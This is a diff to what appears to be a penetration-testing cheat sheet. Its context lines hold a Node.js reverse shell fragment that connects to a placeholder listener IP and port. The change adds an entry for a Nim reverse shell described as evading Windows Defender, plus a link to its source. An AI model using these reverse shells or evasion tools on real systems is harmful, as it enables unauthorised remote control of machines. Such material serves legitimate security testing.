@@ -253,6 +253,11 @@ TABLE OF CONTENTS
                         var client = new net.Socket();
                         client.connect(<LISTENER_PORT>, "<LISTENER_IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
                         sh.stderr.pipe(client);});
+        8.7 NIM
+                8.7.1 [47]
+                        see "rev_shell.nim"
+                        A simple reverse shell written in Nim that bypasses Windows Defender detection.
+
 11. CORS
         11.1 REFLECTED ORIGIN HEADER IN Access-Control-Allow-Origin HEADER
                 11.1.1 DESCRIPTION
@@ -812,6 +817,7 @@ References
 [44] https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_3
 [45] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md#detection
 [46] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md#xmlserializer
+[47] https://github.com/Sn1r/Nim-Reverse-Shell
 
 
 
